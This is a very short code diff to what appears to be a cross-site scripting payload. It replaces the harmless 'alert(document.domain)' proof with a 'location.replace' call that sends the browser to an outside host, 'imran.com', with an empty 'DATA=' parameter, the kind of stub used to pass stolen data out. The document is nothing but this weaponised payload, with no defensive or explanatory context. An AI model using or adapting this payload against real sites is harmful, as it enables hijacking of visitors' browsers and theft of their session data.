@@ -1,1 +1,1 @@
-alert(document.domain)
+location.replace("https://imran.com/?DATA=")
